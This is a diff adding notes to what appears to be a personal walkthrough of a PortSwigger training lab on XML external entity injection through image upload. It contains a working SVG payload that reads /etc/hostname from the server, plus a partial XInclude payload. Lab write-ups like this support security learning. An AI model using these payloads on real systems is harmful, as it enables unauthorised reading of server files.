@@ -158,3 +158,19 @@ Set the value of the productId parameter to:
 
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" 
 
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/ae15670e-d200-48c5-9bfd-2661695ea6f2)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/29777d43-9417-453c-9769-49c26c8f1f29)
+
+**Lab: Exploiting XXE via image file upload**
+
+This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
+
+To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
+
+Create a local SVG image with the following content:
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+Post a comment on a blog post, and upload this image as an avatar.
+When you view your comment, you should see the contents of the /etc/hostname file in your image. Use the "Submit solution" button to submit the value of the server hostname.
+
